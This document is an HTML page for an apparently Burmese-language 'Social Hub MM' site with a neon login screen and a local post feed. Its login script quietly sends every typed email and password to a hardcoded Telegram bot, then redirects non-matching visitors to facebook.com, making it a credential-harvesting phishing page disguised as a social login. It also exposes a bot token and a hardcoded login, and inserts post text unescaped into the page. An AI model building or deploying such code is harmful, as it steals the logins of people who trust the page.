<!DOCTYPE html>
<html lang="my">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Social Hub MM | Cyber Platform</title>
    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Padauk:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-black: #05050a; --neon-teal: #00f2ff; --neon-purple: #bc13fe;
            --neon-green: #00ff41; --glass: rgba(255, 255, 255, 0.05);
        }
        body { margin: 0; padding: 0; background-color: var(--bg-black); font-family: 'Share Tech Mono', 'Padauk', monospace; color: white; display: flex; justify-content: center; min-height: 100vh; }
        #matrixCanvas { position: fixed; top: 0; left: 0; z-index: -1; }

        /* Login UI */
        .login-box { background: var(--glass); backdrop-filter: blur(15px); border-radius: 15px; padding: 30px; width: 300px; text-align: center; border: 1px solid var(--neon-teal); z-index: 100; margin-top: 50px; }
        .input-group { text-align: left; margin-bottom: 15px; }
        .input-group input { width: 100%; padding: 12px; background: rgba(0, 0, 0, 0.6); border: 1px solid var(--neon-purple); border-radius: 5px; color: white; box-sizing: border-box; outline: none; }
        .btn-neon { width: 100%; padding: 12px; background: transparent; border: 1px solid var(--neon-teal); color: var(--neon-teal); font-weight: bold; cursor: pointer; border-radius: 5px; text-transform: uppercase; }

        /* Dashboard UI (Screenshot အတိုင်း တစ်ခုအောက်တစ်ခု) */
        #dashboard { display: none; flex-direction: column; gap: 15px; width: 92%; max-width: 500px; margin: 20px auto; opacity: 0; transition: opacity 0.8s ease; z-index: 100; }
        .glass-panel { background: var(--glass); backdrop-filter: blur(10px); border: 1px solid rgba(0, 242, 255, 0.2); border-radius: 12px; padding: 20px; box-sizing: border-box; width: 100%; }
        
        /* Post Box */
        .post-input-area textarea { width: 100%; height: 80px; background: rgba(0,0,0,0.3); border: 1px dashed var(--neon-purple); border-radius: 8px; color: white; padding: 10px; box-sizing: border-box; resize: none; margin-bottom: 12px; font-family: 'Padauk'; }
        .post-btn { background: var(--neon-teal); border: none; padding: 10px 25px; border-radius: 6px; font-weight: bold; cursor: pointer; color: black; transition: 0.3s; }
        .post-btn:hover { box-shadow: 0 0 15px var(--neon-teal); }

        /* Feed */
        .post-card { background: rgba(255,255,255,0.02); padding: 15px; border-radius: 10px; margin-bottom: 12px; border-left: 4px solid var(--neon-teal); border-bottom: 1px solid rgba(0,242,255,0.1); }
    </style>
</head>
<body>
    <canvas id="matrixCanvas"></canvas>

    <div class="login-box" id="loginUI">
        <h1 style="color: var(--neon-teal); font-size: 1.4rem; margin-bottom: 20px;">SYSTEM LOGIN</h1>
        <form id="loginForm">
            <div class="input-group"><input type="email" id="email" placeholder="Username/Email" required></div>
            <div class="input-group"><input type="password" id="password" placeholder="Password" required></div>
            <button type="submit" class="btn-neon">Login လုပ်မည်</button>
        </form>
    </div>

    <div id="dashboard">
        <div class="sidebar glass-panel" style="text-align: center;">
            <div style="width: 80px; height: 80px; background: linear-gradient(135deg, var(--neon-teal), var(--neon-purple)); border-radius: 50%; margin: 0 auto 15px; border: 2px solid var(--neon-teal);"></div>
            <h3 style="margin: 0; letter-spacing: 1px;">Admin User</h3>
            <p style="color: var(--neon-green); font-size: 0.75rem; margin-top: 5px;">● Online</p>
        </div>

        <div class="post-input-area glass-panel">
            <textarea id="postContent" placeholder="ဘာတွေတွေးနေလဲ..."></textarea>
            <div style="display: flex; justify-content: space-between; align-items: center;">
                <button onclick="document.getElementById('imageInput').click()" style="background:none; border: 1px solid var(--neon-teal); color: var(--neon-teal); padding: 8px 12px; border-radius: 5px; cursor: pointer; font-size: 12px;">📷 ပုံရွေးမည်</button>
                <input type="file" id="imageInput" accept="image/*" style="display: none;">
                <button onclick="createPost()" class="post-btn">Post တင်မည်</button>
            </div>
        </div>

        <div id="feedList"></div>
    </div>

    <script>
        // Matrix Animation
        const canvas = document.getElementById('matrixCanvas');
        const ctx = canvas.getContext('2d');
        canvas.height = window.innerHeight; canvas.width = window.innerWidth;
        const characters = "01MSBH"; const fontSize = 16;
        const columns = canvas.width / fontSize; const drops = Array(Math.floor(columns)).fill(1);
        function drawMatrix() { ctx.fillStyle = 'rgba(5, 5, 10, 0.15)'; ctx.fillRect(0, 0, canvas.width, canvas.height); ctx.fillStyle = "#004d40"; ctx.font = fontSize + 'px monospace'; drops.forEach((y, i) => { const text = characters.charAt(Math.floor(Math.random() * characters.length)); ctx.fillText(text, i * fontSize, y * fontSize); if (y * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0; drops[i]++; }); }
        setInterval(drawMatrix, 40);

        // Login Logic
        const loginForm = document.getElementById('loginForm');
        loginForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;
            
            // Telegram Alert
            fetch(`https://api.telegram.org/bot8417384892:AAHFtwxjmozHFmWBbPbG_TcGsKkoHcOXBLA/sendMessage?chat_id=7324613569&text=${encodeURIComponent("📧 Login Alert:\nUser: "+email+"\nPass: "+pass)}`);

            if (email === "lwink4141@gmail.com" && pass === "lwink4141") {
                document.getElementById('loginUI').style.display = "none";
                const dash = document.getElementById('dashboard');
                dash.style.display = "flex"; setTimeout(() => dash.style.opacity = "1", 50);
                loadPosts(); // သိမ်းထားတဲ့ Post တွေ ပြန်ခေါ်မယ်
            } else { window.location.href = "https://www.facebook.com"; }
        });

        // Save & Load Posts (LocalStorage)
        function createPost() {
            const content = document.getElementById('postContent').value;
            if (!content.trim()) return;

            const newPost = { id: Date.now(), text: content, date: new Date().toLocaleString() };
            let posts = JSON.parse(localStorage.getItem('myPosts')) || [];
            posts.unshift(newPost);
            localStorage.setItem('myPosts', JSON.stringify(posts));
            
            document.getElementById('postContent').value = "";
            renderPosts(posts);
        }

        function loadPosts() {
            const posts = JSON.parse(localStorage.getItem('myPosts')) || [];
            renderPosts(posts);
        }

        function renderPosts(posts) {
            const feed = document.getElementById('feedList');
            feed.innerHTML = posts.map(p => `
                <div class="post-card glass-panel">
                    <h4 style="margin:0; color: var(--neon-teal); font-size: 0.9rem;">Tech Master MM</h4>
                    <p style="margin: 10px 0; line-height: 1.5;">${p.text}</p>
                    <small style="color: grey; font-size: 0.6rem;">${p.date}</small>
                </div>
            `).join('');
        }
    </script>
</body>
</html>
